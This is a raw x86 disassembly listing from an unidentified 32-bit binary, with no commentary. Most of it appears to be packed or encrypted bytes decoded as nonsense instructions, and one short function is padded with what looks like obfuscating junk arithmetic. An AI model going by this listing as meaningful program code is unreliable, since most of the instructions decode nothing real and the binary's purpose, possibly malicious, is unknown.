  40986e:	jg     0x40980e
  409870:	xor    BYTE PTR [edi+0x0],cl
  409873:	add    ch,ch
  409875:	mov    esi,0x3d642fed
  40987a:	out    0x6e,eax
  40987c:	es das 
  40987e:	in     al,0x1d
  409880:	sbb    BYTE PTR [eax],ah
  409882:	cwde   
  409883:	and    eax,ebx
  409885:	enter  0xa959,0x94
  409889:	loop   0x409844
  40988b:	jae    0x40989a
  40988d:	pop    ebp
  40988e:	outs   dx,BYTE PTR ds:[esi]
  40988f:	xchg   ebx,eax
  409890:	scas   eax,DWORD PTR es:[edi]
  409891:	mov    al,ds:0x2273a94b
  409896:	mov    esp,0x4b03bc4b
  40989b:	(bad)  
  40989c:	retf   
  40989d:	jo     0x409849
  40989f:	pop    ds
  4098a0:	cmp    eax,0x8f0dbf3e
  4098a5:	mov    ?,esi
  4098a7:	pop    ecx
  4098a8:	fidiv  DWORD PTR [esi+edi*1+0x7dc07cc1]
  4098af:	push   0x8e7ccf7c
  4098b4:	mov    al,0xca
  4098b6:	dec    esi
  4098b7:	lods   eax,DWORD PTR ds:[esi]
  4098b8:	sbb    al,0x2c
  4098ba:	sub    esp,DWORD PTR [ebx+0x21]
  4098bd:	ins    DWORD PTR es:[edi],dx
  4098be:	in     eax,dx
  4098bf:	in     eax,dx
  4098c0:	out    0x37,al
  4098c2:	mov    ebp,?
  4098c4:	int    0x80
  4098c6:	outs   dx,BYTE PTR ds:[esi]
  4098c7:	rol    bl,0x83
  4098ca:	cwde   
  4098cb:	jle    0x4098dd
  4098cd:	xlat   BYTE PTR ds:[ebx]
  4098ce:	das    
  4098cf:	into   
  4098d0:	and    BYTE PTR [ecx+0x6892a225],cl
  4098d6:	dec    edx
  4098d7:	retf   0x23b6
  4098da:	pop    ebp
  4098db:	jnp    0x4098ce
  4098dd:	lods   eax,DWORD PTR ds:[esi]
  4098de:	add    al,0x36
  4098e0:	(bad)  
  4098e1:	pop    edx
  4098e2:	in     eax,0x42
  4098e4:	in     eax,dx
  4098e5:	out    0x20,al
  4098e7:	add    eax,0xea3b9fcc
  4098ec:	sbb    DWORD PTR [eax+ebp*4-0x374efc05],esi
  4098f3:	add    BYTE PTR [esi-0x57038c62],bh
  4098f9:	mov    DWORD PTR [ecx-0x32c8eebb],ebp
  4098ff:	pop    esp
  409900:	sub    BYTE PTR [ebx-0x3b],0x77
  409904:	out    0x21,eax
  409906:	test   esi,eax
  409908:	add    BYTE PTR [eax+0x72b7270d],ah
  40990e:	dec    ecx
  40990f:	pushf  
  409910:	fadd   QWORD PTR [edi+0x69]
  409913:	into   
  409914:	loopne 0x4098a7
  409916:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409918:	push   es
  409919:	dec    edx
  40991a:	js     0x409955
  40991c:	jno    0x4098d6
  40991e:	lea    esi,[esp+ecx*1+0x67304583]
  409925:	lods   al,BYTE PTR ds:[esi]
  409926:	and    al,al
  409928:	mov    bh,0xf9
  40992a:	inc    edx
  40992b:	push   ebx
  40992c:	adc    al,0xa9
  40992e:	add    al,0x0
  409930:	mov    ecx,0xab1b2492
  409935:	fbld   TBYTE PTR [edx+eax*4+0x33060635]
  40993c:	lods   eax,DWORD PTR ds:[esi]
  40993d:	fisttp WORD PTR [ebx]
  40993f:	mov    cl,0x50
  409941:	shl    BYTE PTR [eax+0x38653ce6],1
  409947:	adc    dh,bl
  409949:	mov    ebx,0x577ccd26
  40994e:	(bad)  
  40994f:	mov    al,ds:0xc75cd13
  409954:	(bad)  
  409955:	(bad)  
  409956:	jb     0x4098df
  409958:	mov    dh,0xd4
  40995a:	iret   
  40995b:	cmc    
  40995c:	mov    ch,0x65
  40995e:	push   ebx
  40995f:	imul   ebx,DWORD PTR [ebp-0x65],0x7c4ab0c0
  409966:	jmp    0xe8a2:0x89d04d3b
  40996d:	mov    ch,0x51
  40996f:	add    al,bl
  409971:	sub    dl,BYTE PTR [ecx-0x27]
  409974:	popf   
  409975:	jns    0x409968
  409977:	stos   BYTE PTR es:[edi],al
  409978:	into   
  409979:	jo     0x409987
  40997b:	cld    
  40997c:	or     dl,BYTE PTR [edi]
  40997e:	push   0x48
  409980:	fld    TBYTE PTR cs:[ebp-0x6da8fa07]
  409987:	push   ecx
  409988:	sub    edx,ebx
  40998a:	and    eax,0x3b755783
  40998f:	push   ebp
  409990:	ror    DWORD PTR [esp+esi*4-0x20],1
  409994:	cld    
  409995:	inc    esi
  409996:	movzx  edi,BYTE PTR [ecx]
  409999:	push   es
  40999a:	mov    dh,0xc7
  40999c:	jecxz  0x4099d3
  40999e:	xchg   edi,eax
  40999f:	cmp    BYTE PTR [edx+0x3306d858],0x66
  4099a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a8:	js     0x409936
  4099aa:	fimul  WORD PTR [esi-0x100a49b0]
  4099b0:	inc    esp
  4099b1:	sub    eax,0xc0afed4f
  4099b6:	test   BYTE PTR [eax],dh
  4099b8:	xchg   edi,eax
  4099b9:	cmc    
  4099ba:	int3   
  4099bb:	nop
  4099bc:	sbb    DWORD PTR [edx+0x55],edx
  4099bf:	mov    bh,0x2
  4099c1:	call   0x5e9fa1c7
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	not    DWORD PTR [ecx]
  409a5a:	or     ah,BYTE PTR [ebp+0x12]
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a7f
  409a66:	(bad)  [eax]
  409a68:	das    
  409a69:	fdiv   DWORD PTR [esi]
  409a6b:	mov    cl,0xa
  409a6d:	mov    ecx,0x2cf1c916
  409a72:	loopne 0x409a4f
  409a74:	dec    edx
  409a75:	mov    al,0x42
  409a77:	add    al,0x38
  409a79:	mov    esi,0x4df03d8d
  409a7e:	nop
  409a7f:	cmp    bl,BYTE PTR [esi-0x7a3848c]
  409a85:	pop    eax
  409a86:	sbb    edi,DWORD PTR [edx]
  409a88:	in     al,0xe5
  409a8a:	mov    esp,0xca263422
  409a8f:	outs   dx,DWORD PTR ds:[esi]
  409a90:	das    
  409a91:	js     0x409a6c
  409a93:	mov    ebp,0xf9402b42
  409a98:	jae    0x409acd
  409a9a:	sub    esp,ecx
  409a9c:	sub    al,0x64
  409a9e:	fdivr  DWORD PTR [ebx+0x17]
  409aa1:	lods   eax,DWORD PTR ds:[esi]
  409aa2:	add    eax,0xf78a16b2
  409aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa8:	(bad)  
  409aa9:	imul   eax,DWORD PTR [ebx-0x64bce77f],0x45523a77
  409ab3:	adc    eax,0x173f62f9
  409ab8:	inc    esi
  409ab9:	xchg   edx,edx
  409abb:	lods   al,BYTE PTR ds:[esi]
  409abc:	xchg   DWORD PTR [ecx+ebp*1],edx
  409abf:	mov    WORD PTR [ebx+0x27],?
  409ac2:	inc    ecx
  409ac3:	pop    ebx
  409ac4:	loopne 0x409a46
  409ac6:	inc    eax
  409ac7:	mov    eax,ds:0x442157e1
  409acc:	sub    BYTE PTR [ebp+0x440b1f6c],0xa9
  409ad3:	jecxz  0x409ae6
  409ad5:	jp     0x409a90
  409ad7:	loope  0x409a91
  409ad9:	jo     0x409b13
  409adb:	sahf   
  409adc:	cli    
  409add:	mov    bl,0x1a
  409adf:	retf   
  409ae0:	sbb    BYTE PTR [eax-0x3b23dc86],bl
  409ae6:	or     DWORD PTR [ecx-0x22ad7a77],ecx
  409aec:	mov    ecx,0x915fddfb
  409af1:	jne    0x409b45
  409af3:	scas   eax,DWORD PTR es:[edi]
  409af4:	mov    ecx,0xcacd8090
  409af9:	lods   al,BYTE PTR ds:[esi]
  409afa:	xor    esp,DWORD PTR [edi]
  409afc:	inc    esi
  409afd:	dec    esi
  409afe:	into   
  409aff:	sub    BYTE PTR [edi-0x27a78600],0x5c
  409b06:	push   edx
  409b07:	push   eax
  409b08:	(bad)  
  409b09:	adc    eax,0x6e112556
  409b0e:	jbe    0x409ad5
  409b10:	jp     0x409b76
  409b12:	dec    edi
  409b13:	repnz shr BYTE PTR [eax],1
  409b16:	cmp    ebx,DWORD PTR [eax+0x28b5c279]
  409b1c:	sub    al,0xf3
  409b1e:	pop    ecx
  409b1f:	inc    edi
  409b20:	push   edx
  409b21:	loope  0x409aa4
  409b23:	jno    0x409ad0
  409b25:	arpl   si,cx
  409b27:	and    eax,0x435e78ed
  409b2c:	inc    edi
  409b2d:	or     BYTE PTR [ecx],bh
  409b2f:	rep ins BYTE PTR es:[edi],dx
  409b31:	sti    
  409b32:	jg     0x409b1f
  409b34:	inc    ecx
  409b35:	mov    edx,0x109e2ea4
  409b3a:	retf   
  409b3b:	call   0x92b9:0xbb772b54
  409b42:	sar    BYTE PTR [esi-0x21ab748e],1
  409b48:	add    ch,BYTE PTR ds:0x2e09b926
  409b4e:	jne    0x409ad8
  409b50:	vmaxss xmm5,xmm0,xmm0
  409b54:	push   0x49238767
  409b59:	adc    al,0x63
  409b5b:	mov    esp,DWORD PTR [esi-0x3bcdeff4]
  409b61:	leave  
  409b62:	stc    
  409b63:	adc    esp,ebx
  409b65:	push   es
  409b66:	adc    eax,0x50848fc5
  409b6b:	out    0x45,al
  409b6d:	das    
  409b6e:	ror    cl,cl
  409b70:	pop    ss
  409b71:	xor    cl,0x1f
  409b74:	aad    0x16
  409b76:	arpl   di,sp
  409b78:	shl    ah,cl
  409b7a:	cmp    al,0x79
  409b7c:	retf   0x5a59
  409b7f:	mov    edx,0x97814927
  409b84:	jmp    0x409c01
  409b86:	mov    ss,WORD PTR [ebp+edx*2-0x499e302f]
  409b8d:	out    0xd,eax
  409b8f:	xchg   esi,eax
  409b90:	mov    ebp,0x9ad1adab
  409b95:	jp     0x409bc9
  409b97:	stos   BYTE PTR es:[edi],al
  409b98:	ss daa 
  409b9a:	sub    DWORD PTR [edx-0x6b],ebx
  409b9d:	push   ecx
  409b9e:	loopne 0x409b99
  409ba0:	jecxz  0x409bc6
  409ba2:	dec    eax
  409ba3:	fxtract 
  409ba5:	lahf   
  409ba6:	mov    ebp,DWORD PTR [ecx+eiz*1-0x7f]
  409baa:	xor    ch,BYTE PTR [edx-0x5d]
  409bad:	pop    ecx
  409bae:	cmp    al,0xb5
  409bb0:	sbb    DWORD PTR ds:0x465b2ea5,0x7b
  409bb7:	fcomp  QWORD PTR [eax]
  409bb9:	stos   DWORD PTR es:[edi],eax
  409bba:	fwait
  409bbb:	bndldx (bad),[ebx+0x26b8e405]
  409bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bc3:	push   edx
  409bc4:	aad    0x75
  409bc6:	adc    dh,0xac
  409bc9:	rcl    DWORD PTR [eax+0x8],0xc4
  409bcd:	ror    BYTE PTR [edi],cl
  409bcf:	rol    ch,1
  409bd1:	fst    QWORD PTR [esi-0x17]
  409bd4:	ds xchg esp,eax
  409bd6:	cs push esi
  409bd8:	adc    DWORD PTR [ecx+0x5a],ecx
  409bdb:	(bad)  
  409bdc:	pop    ebx
  409bdd:	aaa    
  409bde:	(bad)  
  409bdf:	and    DWORD PTR ds:0xea1afe4e,esp
  409be5:	add    al,0xa2
  409be7:	push   ebp
  409be8:	cmp    DWORD PTR [edi-0x58],esp
  409beb:	sub    al,0x45
  409bed:	cld    
  409bee:	ja     0x409bd1
  409bf0:	inc    ebx
  409bf1:	push   es
  409bf2:	pop    eax
  409bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf4:	adc    al,0x21
  409bf6:	fsubr  st,st(5)
  409bf8:	add    eax,0xc80faa23
  409bfd:	repnz pop es
  409bff:	xchg   ebp,eax
  409c00:	adc    eax,edx
  409c02:	ja     0x409c4a
  409c04:	mov    ah,BYTE PTR [esi-0x7ac885d8]
  409c0a:	(bad)  
  409c0b:	ja     0x409c1b
  409c0d:	jp     0x409c83
  409c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c10:	ficom  DWORD PTR [edi+0x1e]
  409c13:	(bad)  [ebx+0x7b]
  409c16:	adc    al,0x8
  409c18:	or     BYTE PTR [edi+edi*4-0x1f],0x63
  409c1d:	pop    ss
  409c1e:	jge    0x409c03
  409c20:	xchg   BYTE PTR [ecx+0x3],cl
  409c23:	add    eax,0xdf25c24a
  409c28:	cmp    ebp,eax
  409c2a:	clc    
  409c2b:	cli    
  409c2c:	leave  
  409c2d:	int    0xbd
  409c2f:	fwait
  409c30:	mov    ch,0x28
  409c32:	or     DWORD PTR [edi+0x20],eax
  409c35:	sti    
  409c36:	mov    BYTE PTR [ecx+0x39],dl
  409c39:	idiv   ecx
  409c3b:	test   al,0x37
  409c3d:	lods   eax,DWORD PTR ds:[esi]
  409c3e:	inc    eax
  409c3f:	fwait
  409c40:	out    dx,al
  409c41:	lock sar esi,0x41
  409c45:	cmp    al,0xe1
  409c47:	mov    bh,al
  409c49:	lock popf 
  409c4b:	dec    esi
  409c4c:	mov    eax,es:0xe278b2ed
  409c52:	in     eax,dx
  409c53:	scas   al,BYTE PTR es:[edi]
  409c54:	scas   al,BYTE PTR es:[edi]
  409c55:	adc    ch,BYTE PTR [ecx]
  409c57:	jmp    0x4438:0x4cec7613
  409c5e:	std    
  409c5f:	add    cl,BYTE PTR [ecx-0x3aa2efb0]
  409c65:	dec    esp
  409c66:	inc    ebx
  409c67:	addr16 jmp 0xa743:0x969ec074
  409c6f:	(bad)  
  409c70:	sub    DWORD PTR [edi+0x42ba3e],esi
  409c76:	mov    WORD PTR [edx],ss
  409c78:	pushf  
  409c79:	test   al,0x9c
  409c7b:	outs   dx,DWORD PTR ds:[esi]
  409c7c:	sbb    ebp,DWORD PTR ds:0x1fd25e3b
  409c82:	daa    
  409c83:	pushf  
  409c84:	cs push cs
  409c86:	cmp    al,BYTE PTR [ebx+0x6bb514a8]
  409c8c:	sub    BYTE PTR [ecx+eax*2-0x72],dl
  409c90:	sar    BYTE PTR [esi+0x2c],cl
  409c93:	in     eax,dx
  409c94:	sti    
  409c95:	mov    edx,0x108ab50e
  409c9a:	addr16 inc ebx
  409c9c:	in     al,dx
  409c9d:	jno    0x409c32
  409c9f:	xchg   edi,eax
  409ca0:	add    DWORD PTR [edi-0x365fcde2],ebp
  409ca6:	(bad)  
  409ca7:	int3   
  409ca8:	mov    ecx,0x685d2b8b
  409cad:	jb     0x409ccc
  409caf:	ins    DWORD PTR es:[edi],dx
  409cb0:	sub    ecx,DWORD PTR [ebx+0x2d]
  409cb3:	pusha  
  409cb4:	xchg   edx,eax
  409cb5:	imul   ebx,eax,0xffffffab
  409cb8:	xor    ch,BYTE PTR [edx-0x63bce6ab]
  409cbe:	into   
  409cbf:	dec    edi
  409cc0:	adc    BYTE PTR [ebp+0x39696adc],bl
  409cc6:	cld    
  409cc7:	mov    dh,0xd6
  409cc9:	push   eax
  409cca:	push   ecx
  409ccb:	dec    eax
  409ccc:	pusha  
  409ccd:	out    0x10,eax
  409ccf:	dec    ebp
  409cd0:	lock aaa 
  409cd2:	leave  
  409cd3:	addr16 ret 0xbbfd
  409cd7:	push   eax
  409cd8:	ror    DWORD PTR [eax],cl
  409cda:	jmp    0xb61b158
  409cdf:	sub    eax,0x40ef1767
  409ce4:	push   esp
  409ce5:	stos   BYTE PTR es:[edi],al
  409ce6:	sub    eax,0x2d6473ab
  409ceb:	sub    cl,dh
  409ced:	mov    cs,WORD PTR [ebx-0x3a]
  409cf0:	jle    0x409d44
  409cf2:	pop    esi
  409cf3:	push   gs
  409cf5:	je     0x409ca5
  409cf7:	jmp    0x409d17
  409cf9:	imul   ecx,DWORD PTR [ecx-0x22],0x49
  409cfd:	xlat   BYTE PTR ds:[ebx]
  409cfe:	push   cs
  409cff:	push   esi
  409d00:	or     al,ch
  409d02:	lods   eax,DWORD PTR ds:[esi]
  409d03:	sub    DWORD PTR [eax-0x6b],ebp
  409d06:	add    al,0x75
  409d08:	push   edx
  409d09:	repnz sub eax,DWORD PTR [eax-0x56fe7a0d]
  409d10:	push   es
  409d11:	in     al,dx
  409d12:	jmp    0xa9010dc0
  409d17:	add    BYTE PTR [ecx],cl
  409d19:	imul   ecx,DWORD PTR [eax+0x6],0x4e9eaad4
  409d20:	sbb    eax,0xe4df67ca
  409d25:	jo     0x409cfd
  409d27:	ret    
  409d28:	mov    ch,0x91
  409d2a:	arpl   WORD PTR [ecx+ecx*1+0x66923528],si
  409d31:	add    esi,DWORD PTR [ebx+0x463c80db]
  409d37:	adc    ecx,ebx
  409d39:	xchg   ebx,eax
  409d3a:	std    
  409d3b:	mov    al,ds:0xc2500d02
  409d40:	mov    ebx,0x9cc389f7
  409d45:	cmp    eax,0xc0582d12
  409d4a:	ror    BYTE PTR [ebx],cl
  409d4c:	imul   DWORD PTR [ebx]
  409d4e:	bound  eax,QWORD PTR [ebx+0x66159525]
  409d54:	mov    bl,0x40
  409d56:	and    eax,0xb9383dbe
  409d5b:	xor    DWORD PTR [edi-0x6cb1196c],0xdf23fb8b
  409d65:	sbb    eax,DWORD PTR [ecx+0x750a54ab]
  409d6b:	dec    ebp
  409d6c:	sar    DWORD PTR [eax+0x44],1
  409d6f:	imul   edx,DWORD PTR [ecx],0xffffffb3
  409d72:	push   es
  409d73:	xchg   esi,eax
  409d74:	aas    
  409d75:	or     BYTE PTR [esi],dl
  409d77:	mov    al,0xf5
  409d79:	mov    esi,0x22977c7c
  409d7e:	cmp    cl,bh
  409d80:	sub    BYTE PTR [ecx],al
  409d82:	mov    bl,0x23
  409d84:	jne    0x409d5a
  409d86:	fild   WORD PTR [edx+0x10]
  409d89:	jmp    0x409d53
  409d8b:	aad    0x34
  409d8d:	jbe    0x409dfc
  409d8f:	and    al,0x80
  409d91:	mov    eax,ds:0x50cfd4ee
  409d96:	xor    cl,BYTE PTR [edx]
  409d98:	std    
  409d99:	(bad)  
  409d9a:	les    esi,FWORD PTR [eax]
  409d9c:	nop
  409d9d:	mov    bh,0x6f
  409d9f:	enter  0xe281,0xc1
  409da3:	mov    dh,0x97
  409da5:	push   ebp
  409da6:	mov    al,ds:0xa59eb18f
  409dab:	push   ebx
  409dac:	call   0x3ca59e9d
  409db1:	es (bad) 
  409db3:	retf   
  409db4:	bound  edx,QWORD PTR [edx+0xa]
  409db7:	or     DWORD PTR [esi],edx
  409db9:	sbb    DWORD PTR [ebx*1+0x5da2d4b2],ebp
  409dc0:	xor    ecx,edx
  409dc2:	test   al,0x58
  409dc4:	out    dx,al
  409dc5:	dec    ecx
  409dc6:	pushf  
  409dc7:	(bad)  
  409dc8:	(bad)  
  409dc9:	xor    edx,DWORD PTR [edi]
  409dcb:	out    0xf9,eax
  409dcd:	ds addr16 daa 
  409dd0:	pop    ds
  409dd1:	cmp    al,0x8e
  409dd3:	aad    0xfc
  409dd5:	arpl   WORD PTR [ebx],dx
  409dd7:	pop    ecx
  409dd8:	clc    
  409dd9:	aas    
  409dda:	ror    BYTE PTR [eax+0x2bb49027],1
  409de0:	scas   eax,DWORD PTR es:[edi]
  409de1:	pop    ss
  409de2:	pop    esp
  409de3:	xor    bl,BYTE PTR [ecx-0x5c]
  409de6:	xlat   BYTE PTR ds:[ebx]
  409de7:	int    0x12
  409de9:	das    
  409dea:	(bad)  
  409deb:	pop    ecx
  409dec:	call   0x7ae1916a
  409df1:	jge    0x409e4b
  409df3:	xchg   ebx,eax
  409df4:	lds    edi,FWORD PTR [eax+0x10]
  409df7:	fcomp  DWORD PTR [eax-0x1203bd7f]
  409dfd:	aaa    
  409dfe:	or     BYTE PTR [edx],al
  409e00:	scas   al,BYTE PTR es:[edi]
  409e01:	xor    DWORD PTR [ecx+0x3e77df6],ebp
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fd8a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	pop    eax
  409e82:	and    al,0xff
  409e84:	push   eax
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	div    al
  409e8f:	dec    eax
  409e90:	mov    eax,DWORD PTR [edx+edx*1-0xe]
  409e94:	jg     0x409f0e
  409e96:	jns    0x409e58
  409e98:	je     0x409e55
  409e9a:	or     bl,BYTE PTR [edi+edi*8+0xb]
  409e9e:	das    
  409e9f:	imul   ecx,DWORD PTR [edx-0x14],0x55
  409ea3:	(bad)  [esi+edx*8]
  409ea6:	sbb    eax,0x23fdd0b0
  409eab:	mov    bl,0x4c
  409ead:	in     eax,dx
  409eae:	pop    ebx
  409eaf:	out    0x63,eax
  409eb1:	icebp  
  409eb2:	mov    al,0x81
  409eb4:	and    DWORD PTR [esi],ecx
  409eb6:	leave  
  409eb7:	sbb    al,0xc9
  409eb9:	lea    ebx,[edx-0x39b9506f]
  409ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ec0:	jecxz  0x409ebc
  409ec2:	pop    ebx
  409ec3:	aaa    
  409ec4:	mov    dh,0x1d
  409ec6:	arpl   WORD PTR [esi-0x21],si
  409ec9:	(bad)  
  409eca:	jmp    0x409efe
  409ecc:	int3   
  409ecd:	aam    0xb8
  409ecf:	dec    eax
  409ed0:	push   ds
  409ed1:	mov    cl,0x4d
  409ed3:	mov    cl,BYTE PTR [edx]
  409ed5:	shl    cl,0xf3
  409ed8:	lds    edi,FWORD PTR [edi]
  409eda:	inc    ebx
  409edb:	pop    esi
  409edc:	call   0x596c:0xbcc7f71e
  409ee3:	mov    bh,0xe1
  409ee5:	cmp    dh,BYTE PTR [edi+0x50]
  409ee8:	cmp    BYTE PTR [ecx+0x2e],0x40
  409eec:	sahf   
  409eed:	mov    ds:0xf16bded5,eax
  409ef2:	inc    edx
  409ef3:	call   0x9284:0x74f93694
  409efa:	add    eax,0x4bc90208
  409eff:	int3   
  409f00:	lea    esi,[edx]
  409f02:	mov    ds:0xe03af5d7,al
  409f07:	mov    ecx,0xbc97d3d
  409f0c:	jbe    0x409f21
  409f0e:	fidiv  WORD PTR [esi-0x68bc80da]
  409f14:	mov    bl,0xf1
  409f16:	into   
  409f17:	retf   
  409f18:	ss xchg esp,eax
  409f1a:	lock cmc 
  409f1c:	shl    al,0x2
  409f1f:	enter  0x4e5b,0x5b
  409f23:	push   ebp
  409f24:	jp     0x409ee1
  409f26:	les    esp,FWORD PTR [esi]
  409f28:	mov    BYTE PTR [ebx+0x55],bl
  409f2b:	cs sbb eax,0xfe938160
  409f31:	call   0x24f2:0x2b67703f
  409f38:	ds pop ecx
  409f3a:	lods   al,BYTE PTR ds:[esi]
  409f3b:	mov    ah,0xb2
  409f3d:	(bad)  
  409f3e:	xor    DWORD PTR [edx+0x2a],edi
  409f41:	or     DWORD PTR [ecx-0x25],esp
  409f44:	add    al,bh
  409f46:	pop    ebp
  409f47:	pushf  
  409f48:	repz call 0x3d1bb257
  409f4e:	add    eax,ebp
  409f50:	mov    bh,0xf3
  409f52:	xlat   BYTE PTR ds:[ebx]
  409f53:	out    0x8b,al
  409f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f56:	test   DWORD PTR [edi],esp
  409f58:	(bad)  
  409f59:	in     al,0x15
  409f5b:	cwde   
  409f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5d:	enter  0x57d9,0x63
  409f61:	popf   
  409f62:	xchg   DWORD PTR [ebx+0x25],esp
  409f65:	dec    ecx
  409f66:	or     DWORD PTR [edi+0x653e08c4],0x5f
  409f6d:	sub    ebp,ebx
  409f6f:	lods   eax,DWORD PTR ds:[esi]
  409f70:	iret   
  409f71:	dec    eax
  409f72:	cmp    al,0xdf
  409f74:	lods   eax,DWORD PTR ds:[esi]
  409f75:	inc    ecx
  409f76:	cmp    al,0x8f
  409f78:	mov    bh,0x54
  409f7a:	mov    ch,0x19
  409f7c:	test   DWORD PTR [ebp-0x724419b4],ebx
  409f82:	mov    WORD PTR [esp+ebp*8+0x35],?
  409f86:	sbb    al,0x31
  409f88:	mov    ds:0x50448b8,al
  409f8d:	out    dx,al
  409f8e:	mov    bh,0xd6
  409f90:	cmp    al,0x2a
  409f92:	pusha  
  409f93:	dec    edx
  409f94:	pop    es
  409f95:	jb     0x409ff1
  409f97:	jo     0x40a018
  409f99:	lahf   
  409f9a:	inc    edx
  409f9b:	xchg   DWORD PTR [esi+0x22],eax
  409f9e:	push   cs
  409f9f:	push   0x0
  409fa1:	stos   BYTE PTR es:[edi],al
  409fa2:	adc    ebp,DWORD PTR [ecx-0x4a]
  409fa5:	sub    BYTE PTR [ebx-0xa92be23],0x7f
  409fac:	out    dx,al
  409fad:	aam    0x50
  409faf:	fcomp  QWORD PTR [ecx]
  409fb1:	dec    esp
  409fb2:	aam    0xde
  409fb4:	sub    bl,BYTE PTR [esi]
  409fb6:	cmp    cl,BYTE PTR [esi-0x6d]
  409fb9:	pop    ecx
  409fba:	scas   al,BYTE PTR es:[edi]
  409fbb:	or     DWORD PTR [eax-0x4f],ebp
  409fbe:	xchg   BYTE PTR ds:0x65dbc5e7,dh
  409fc4:	fs pop ebp
  409fc6:	out    dx,eax
  409fc7:	inc    esp
  409fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fc9:	jge    0x40a038
  409fcb:	mov    ah,0x66
  409fcd:	aas    
  409fce:	clc    
  409fcf:	jae    0x409f52
  409fd1:	xor    cl,BYTE PTR [edx+0x79]
  409fd4:	mov    WORD PTR [eax-0x16],fs
  409fd7:	out    0x28,al
  409fd9:	nop
  409fda:	psubw  mm4,QWORD PTR [edx+0x27051209]
  409fe1:	sub    eax,0x3195eca
  409fe6:	xlat   BYTE PTR ds:[ebx]
  409fe7:	and    esp,DWORD PTR [edi-0x41]
  409fea:	or     ah,BYTE PTR [eax+0xe]
  409fed:	mov    dh,0x5f
  409fef:	outs   dx,BYTE PTR ds:[esi]
  409ff0:	(bad)  
  409ff1:	lods   eax,DWORD PTR ds:[esi]
  409ff2:	jnp    0x40a018
  409ff4:	pop    es
  409ff5:	(bad)  
  409ff7:	lds    ebx,FWORD PTR [ebp+0x7a17e0ca]
  409ffd:	gs loope 0x40a03b
  40a000:	test   al,0x3
  40a002:	repnz mov DWORD PTR [eax],ecx
  40a005:	add    BYTE PTR ds:0x8824c67e,dl
  40a00b:	mov    ebp,ss
  40a00d:	(bad)  
  40a00e:	pop    esi
  40a00f:	push   esp
  40a010:	jae    0x409fb6
  40a012:	xor    esp,DWORD PTR [ecx+0x56]
  40a015:	mov    ah,dl
  40a017:	aaa    
  40a018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a019:	imul   esi,DWORD PTR [ebx+ebx*1+0x3d74de8c],0xffffff8f
  40a021:	push   cs
  40a022:	retf   0xf373
  40a025:	ret    
  40a026:	jno    0x40a059
  40a028:	cmp    DWORD PTR [edx+0x6b],eax
  40a02b:	cmc    
  40a02c:	fsubr  st,st(5)
  40a02e:	adc    eax,0x3529024f
